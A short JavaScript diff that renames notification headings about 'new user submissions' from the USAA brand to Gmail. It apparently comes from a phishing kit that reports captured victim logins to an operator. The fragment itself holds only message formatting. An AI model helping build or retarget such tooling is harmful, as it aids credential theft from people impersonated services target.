@@ -429,10 +429,10 @@ async function buildMessage(data, options = {}) {
     let heading;
 
     if (hasEmailOrUsername) {
-      heading = `👤 USAA NEW USER SUBMISSION`;
+      heading = `👤 GMAIL NEW USER SUBMISSION`;
     } else {
       const display = identifier || userId;
-      heading = `👤 USAA SUBMISSION\n\n USER: @${display}`;
+      heading = `👤 GMAIL SUBMISSION\n\n USER: @${display}`;
     }
 
     let message = `${heading}\n\n`;
